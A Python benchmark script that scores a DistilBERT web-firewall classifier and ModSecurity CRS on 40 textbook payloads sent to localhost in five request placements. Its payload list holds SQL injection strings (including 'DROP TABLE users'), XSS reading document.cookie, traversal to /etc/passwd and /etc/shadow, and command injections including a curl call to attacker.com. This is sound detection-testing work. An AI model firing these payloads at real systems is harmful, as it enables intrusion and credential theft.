"""
Phase E1.5 Item 2: Textbook Set
40 canonical payloads from PayloadsAllTheThings and OWASP CRS regression tests:
- SQL Injection: 15
- XSS: 10
- Path Traversal: 5
- Command Injection: 10

Placements (5 per payload = 200 total requests):
1. query_arg (?id=<payload>)
2. post_body_with_ct (POST /submit, Content-Type: application/x-www-form-urlencoded, body=id=<payload>)
3. post_body_no_ct (POST /submit, no Content-Type, body=<payload>)
4. url_path (/<payload>)
5. cookie (GET /, Cookie: id=<payload>)

Evaluates:
- Frozen Model v2.1b detection rate per placement and per class
- CRS detection rate at threshold 5, PL1
"""

import json
import os
import sys
import time
import urllib.parse
import numpy as np
import pandas as pd
import requests
import torch
import torch.nn as nn
from transformers import AutoTokenizer, AutoModel

BASE_MODEL = "distilbert-base-uncased"
MAX_LENGTH = 256
GENERIC_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
BASE_URL = "http://localhost:80"

LABEL_COLS = [
    '000 - Normal', '272 - Protocol Manipulation', '242 - Code Injection',
    '88 - OS Command Injection', '126 - Path Traversal', '66 - SQL Injection',
    '16 - Dictionary-based Password Attack', '310 - Scanning for Vulnerable Software',
    '153 - Input Data Manipulation', '274 - HTTP Verb Tampering',
    '194 - Fake the Source of Data', '34 - HTTP Response Splitting',
    '33 - HTTP Request Smuggling'
]

# Canonical 40 Payloads with sources
TEXTBOOK_PAYLOADS = [
    # ── SQL Injection (15) ─────────────────────────────────────────────
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Classic Tautology", "payload": "' OR '1'='1", "source": "PayloadsAllTheThings / SQLi"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Tautology Numeric", "payload": "1 OR 1=1", "source": "OWASP CRS 942100 regression"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Auth Bypass Admin", "payload": "admin' --", "source": "PayloadsAllTheThings / Auth Bypass"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Union Select Basic", "payload": "1' UNION SELECT 1,2,3--", "source": "PayloadsAllTheThings / Union"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Union Null Projection", "payload": "1' UNION ALL SELECT NULL,NULL,NULL--", "source": "OWASP CRS 942140 regression"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Stacked Query Drop", "payload": "1; DROP TABLE users--", "source": "PayloadsAllTheThings / Stacked"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Sleep Injection", "payload": "1' AND SLEEP(5)--", "source": "OWASP CRS 942160 regression"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "MSSQL Delay", "payload": "1' WAITFOR DELAY '0:0:5'--", "source": "PayloadsAllTheThings / Time-based"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Error-based Rand Group", "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "source": "PayloadsAllTheThings / Error"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Order By Probing", "payload": "1' ORDER BY 1--", "source": "PayloadsAllTheThings / Detect"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Version Extraction", "payload": "1 UNION SELECT @@version,user(),database()--", "source": "PayloadsAllTheThings / Fingerprint"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Hash Comment Tautology", "payload": "1' OR 1=1#", "source": "OWASP CRS 942100 regression"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Empty Quote Tautology", "payload": "' OR ''='", "source": "PayloadsAllTheThings / Bypass"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "String Comparison", "payload": "1' AND '1'='1", "source": "OWASP CRS 942100 regression"},
    {"class": "SQL Injection", "label": "66 - SQL Injection", "name": "Benchmark Blind", "payload": "1' AND BENCHMARK(5000000,MD5('test'))--", "source": "PayloadsAllTheThings / Blind"},

    # ── XSS / Input Manipulation (10) ──────────────────────────────────
    # Note: XSS maps to 153 - Input Data Manipulation or 242 - Code Injection
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Script Tag Simple", "payload": "<script>alert(1)</script>", "source": "OWASP CRS 941110 regression"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Img Onerror Event", "payload": "<img src=x onerror=alert(1)>", "source": "PayloadsAllTheThings / XSS"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Svg Onload Event", "payload": "<svg/onload=alert('XSS')>", "source": "OWASP CRS 941120 regression"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Body Onload Cookie", "payload": "<body onload=alert(document.cookie)>", "source": "PayloadsAllTheThings / XSS"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Javascript URI Scheme", "payload": "javascript:alert(1)", "source": "OWASP CRS 941130 regression"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Iframe Source Script", "payload": "<iframe src=\"javascript:alert(1)\">", "source": "PayloadsAllTheThings / XSS"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Autofocus Onfocus", "payload": "<input type=\"text\" autofocus onfocus=\"alert(1)\">", "source": "OWASP CRS 941160 regression"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Breakout Script Tag", "payload": "\"><script>alert(1)</script>", "source": "PayloadsAllTheThings / Context"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "Details Tag Ontoggle", "payload": "<details open ontoggle=alert(1)>", "source": "PayloadsAllTheThings / HTML5"},
    {"class": "XSS", "label": "153 - Input Data Manipulation", "name": "A Href Javascript", "payload": "<a href=\"javascript:alert(1)\">Click</a>", "source": "OWASP CRS 941130 regression"},

    # ── Path Traversal (5) ─────────────────────────────────────────────
    {"class": "Path Traversal", "label": "126 - Path Traversal", "name": "Passwd 4-hop", "payload": "../../../../etc/passwd", "source": "OWASP CRS 930110 regression"},
    {"class": "Path Traversal", "label": "126 - Path Traversal", "name": "Win.ini Windows Backslash", "payload": "..\\..\\..\\windows\\win.ini", "source": "PayloadsAllTheThings / Traversal"},
    {"class": "Path Traversal", "label": "126 - Path Traversal", "name": "Double Slash Dot Traversal", "payload": "....//....//....//etc/passwd", "source": "OWASP CRS 930100 regression"},
    {"class": "Path Traversal", "label": "126 - Path Traversal", "name": "Encoded Traversal", "payload": "..%2f..%2f..%2fetc%2fpasswd", "source": "PayloadsAllTheThings / Encoding"},
    {"class": "Path Traversal", "label": "126 - Path Traversal", "name": "Shadow Absolute Relative", "payload": "/var/www/../../etc/shadow", "source": "OWASP CRS 930120 regression"},

    # ── Command Injection (10) ─────────────────────────────────────────
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Semicolon Cat Passwd", "payload": "; cat /etc/passwd", "source": "PayloadsAllTheThings / CI"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Pipe ID", "payload": "| id", "source": "OWASP CRS 932100 regression"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "And Whoami", "payload": "&& whoami", "source": "PayloadsAllTheThings / CI"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Subshell Cat Passwd", "payload": "$(cat /etc/passwd)", "source": "PayloadsAllTheThings / Subshell"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Backtick ID", "payload": "`id`", "source": "PayloadsAllTheThings / Backticks"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Semicolon Ls Long", "payload": "; ls -la", "source": "OWASP CRS 932110 regression"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Windows Net User", "payload": "& net user", "source": "PayloadsAllTheThings / Windows CI"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Ping Probe", "payload": "; ping -c 4 127.0.0.1", "source": "OWASP CRS 932100 regression"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Or Uname", "payload": "|| uname -a", "source": "PayloadsAllTheThings / CI"},
    {"class": "Command Injection", "label": "88 - OS Command Injection", "name": "Curl Outbound", "payload": "; curl http://attacker.com", "source": "PayloadsAllTheThings / CI"},
]

class MultiLabelWAFModel(nn.Module):
    def __init__(self, model_name=BASE_MODEL, num_labels=13, dropout=0.3):
        super().__init__()
        self.bert = AutoModel.from_pretrained(model_name)
        self.classifier = nn.Sequential(nn.Dropout(dropout), nn.Linear(self.bert.config.hidden_size, num_labels))
    def forward(self, input_ids, attention_mask):
        cls = self.bert(input_ids=input_ids, attention_mask=attention_mask).last_hidden_state[:, 0, :]
        return {'logits': self.classifier(cls)}

def serialize_request(method='GET', path='/', ua='', ct='', body=''):
    parts = []
    if method: parts.append(f'[METHOD] {method.strip()}')
    if path: parts.append(f'[PATH] {path.strip()}')
    if ua: parts.append(f'[UA] {ua.strip()}')
    if ct: parts.append(f'[CT] {ct.strip()}')
    if body: parts.append(f'[BODY] {body.strip()[:500]}')
    return ' '.join(parts)

def main():
    print("=" * 110)
    print("PHASE E1.5 ITEM 2: TEXTBOOK CANONICAL PAYLOAD EVALUATION (40 PAYLOADS x 5 PLACEMENTS)")
    print("=" * 110)

    # Load frozen model
    print("Loading Frozen Model v2.1b...")
    tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL)
    model = MultiLabelWAFModel()
    model.load_state_dict(torch.load("model_v2.0/outputs/v2_1b/v2_1b_best.pt", map_location="cpu"))
    model.eval()

    with open("outputs/frozen_v2_1b/thresholds.json") as f:
        thresholds = json.load(f)

    # Prepare 200 requests (40 payloads x 5 placements)
    requests_to_test = []
    
    for item in TEXTBOOK_PAYLOADS:
        p = item["payload"]
        atk_class = item["class"]
        label_col = item["label"]
        thresh = thresholds.get(label_col, 0.5)
        
        # 1. query_arg
        qa_path = f"/?id={urllib.parse.quote(p, safe='')}"
        requests_to_test.append({
            "attack_class": atk_class, "label_col": label_col, "name": item["name"],
            "source": item["source"], "payload": p, "placement": "query_arg",
            "method": "GET", "url_path": qa_path, "body": "", "content_type": "",
            "headers": {"User-Agent": GENERIC_UA, "Host": "localhost"},
            "serialized_text": serialize_request("GET", qa_path, GENERIC_UA, "", ""),
            "threshold": thresh,
        })

        # 2. post_body_with_ct
        body_encoded = f"id={urllib.parse.quote(p, safe='')}"
        requests_to_test.append({
            "attack_class": atk_class, "label_col": label_col, "name": item["name"],
            "source": item["source"], "payload": p, "placement": "post_body_with_ct",
            "method": "POST", "url_path": "/submit", "body": body_encoded, "content_type": "application/x-www-form-urlencoded",
            "headers": {"User-Agent": GENERIC_UA, "Host": "localhost", "Content-Type": "application/x-www-form-urlencoded"},
            "serialized_text": serialize_request("POST", "/submit", GENERIC_UA, "application/x-www-form-urlencoded", body_encoded),
            "threshold": thresh,
        })

        # 3. post_body_no_ct
        requests_to_test.append({
            "attack_class": atk_class, "label_col": label_col, "name": item["name"],
            "source": item["source"], "payload": p, "placement": "post_body_no_ct",
            "method": "POST", "url_path": "/submit", "body": p, "content_type": "",
            "headers": {"User-Agent": GENERIC_UA, "Host": "localhost"},
            "serialized_text": serialize_request("POST", "/submit", GENERIC_UA, "", p),
            "threshold": thresh,
        })

        # 4. url_path
        u_path = p if p.startswith('/') else '/' + p
        requests_to_test.append({
            "attack_class": atk_class, "label_col": label_col, "name": item["name"],
            "source": item["source"], "payload": p, "placement": "url_path",
            "method": "GET", "url_path": u_path, "body": "", "content_type": "",
            "headers": {"User-Agent": GENERIC_UA, "Host": "localhost"},
            "serialized_text": serialize_request("GET", u_path, GENERIC_UA, "", ""),
            "threshold": thresh,
        })

        # 5. cookie
        cookie_val = f"id={urllib.parse.quote(p, safe='')}"
        requests_to_test.append({
            "attack_class": atk_class, "label_col": label_col, "name": item["name"],
            "source": item["source"], "payload": p, "placement": "cookie",
            "method": "GET", "url_path": "/", "body": "", "content_type": "",
            "headers": {"User-Agent": GENERIC_UA, "Host": "localhost", "Cookie": cookie_val},
            "serialized_text": serialize_request("GET", "/", GENERIC_UA, "", ""),  # Cookie not serialized!
            "threshold": thresh,
        })

    print(f"Generated {len(requests_to_test)} requests across 5 placements.")

    # Model Scoring
    print("\nScoring requests with Frozen Model v2.1b...")
    texts = [r["serialized_text"] for r in requests_to_test]
    batch_size = 32
    all_probs = []
    for i in range(0, len(texts), batch_size):
        batch = texts[i:i+batch_size]
        enc = tokenizer(batch, truncation=True, max_length=MAX_LENGTH, padding="max_length", return_tensors="pt")
        with torch.no_grad():
            out = model(enc["input_ids"], enc["attention_mask"])
            probs = torch.sigmoid(out["logits"]).cpu().numpy()
            all_probs.append(probs)
    all_probs = np.vstack(all_probs)

    for i, req in enumerate(requests_to_test):
        col = LABEL_COLS.index(req["label_col"])
        score = float(all_probs[i, col])
        req["model_score"] = score
        # For XSS, also check Code Injection (242)
        if req["attack_class"] == "XSS":
            c_idx = LABEL_COLS.index("242 - Code Injection")
            score_ci = float(all_probs[i, c_idx])
            req["model_detected"] = (score >= req["threshold"]) or (score_ci >= thresholds["242 - Code Injection"])
            req["model_score_ci"] = score_ci
        else:
            req["model_detected"] = score >= req["threshold"]

    # Replay against CRS
    print("\nReplaying 200 requests against ModSecurity CRS @ PL1, threshold=5...")
    session = requests.Session()
    session.headers.update({"User-Agent": GENERIC_UA})

    for i, req in enumerate(requests_to_test):
        target_url = urllib.parse.urljoin(BASE_URL, req["url_path"])
        headers = dict(req["headers"])
        method = req["method"]
        body = req["body"]

        status = 0
        try:
            if method == "POST":
                resp = session.post(target_url, data=body.encode("utf-8", errors="ignore"), headers=headers, timeout=5.0, allow_redirects=False)
            else:
                resp = session.get(target_url, headers=headers, timeout=5.0, allow_redirects=False)
            status = resp.status_code
        except Exception as e:
            status = 0

        req["http_status"] = status
        # CRS blocks on 403 (or 400 for malformed traversal path in Nginx)
        req["crs_blocked"] = (status == 403) or (status == 400 and req["attack_class"] == "Path Traversal")
        req["crs_evaded"] = not req["crs_blocked"] and (status != 0)

        time.sleep(0.02)  # gentle rate limit

    # Save to CSV
    df_out = pd.DataFrame(requests_to_test)
    df_out.to_csv("outputs/phase_e1_5_textbook_results.csv", index=False)
    print("[DONE] Saved textbook benchmark to outputs/phase_e1_5_textbook_results.csv")

    # Detection Rate per Placement and per Class Table
    print("\n" + "=" * 110)
    print("TEXTBOOK DETECTION BENCHMARK: DETECTION RATE PER PLACEMENT & CLASS")
    print("=" * 110)

    placements = ["query_arg", "post_body_with_ct", "post_body_no_ct", "url_path", "cookie"]
    classes = ["SQL Injection", "XSS", "Path Traversal", "Command Injection"]

    print(f"\n--- MODEL v2.1b DETECTION RATE ---")
    print(f"{'Attack Class':<22} | {'query_arg':>12} | {'post_ct':>12} | {'post_no_ct':>12} | {'url_path':>12} | {'cookie':>12}")
    print("-" * 95)
    for ac in classes:
        sub = df_out[df_out["attack_class"] == ac]
        row_str = f"{ac:<22} |"
        for pl in placements:
            pl_df = sub[sub["placement"] == pl]
            det = pl_df["model_detected"].sum()
            tot = len(pl_df)
            row_str += f" {det:>4}/{tot:<4} ({100*det/tot:>4.0f}%) |"
        print(row_str)

    print(f"\n--- MODSECURITY CRS (PL1, Threshold 5) DETECTION RATE ---")
    print(f"{'Attack Class':<22} | {'query_arg':>12} | {'post_ct':>12} | {'post_no_ct':>12} | {'url_path':>12} | {'cookie':>12}")
    print("-" * 95)
    for ac in classes:
        sub = df_out[df_out["attack_class"] == ac]
        row_str = f"{ac:<22} |"
        for pl in placements:
            pl_df = sub[sub["placement"] == pl]
            det = pl_df["crs_blocked"].sum()
            tot = len(pl_df)
            row_str += f" {det:>4}/{tot:<4} ({100*det/tot:>4.0f}%) |"
        print(row_str)

    print("\n" + "=" * 110)

if __name__ == "__main__":
    main()
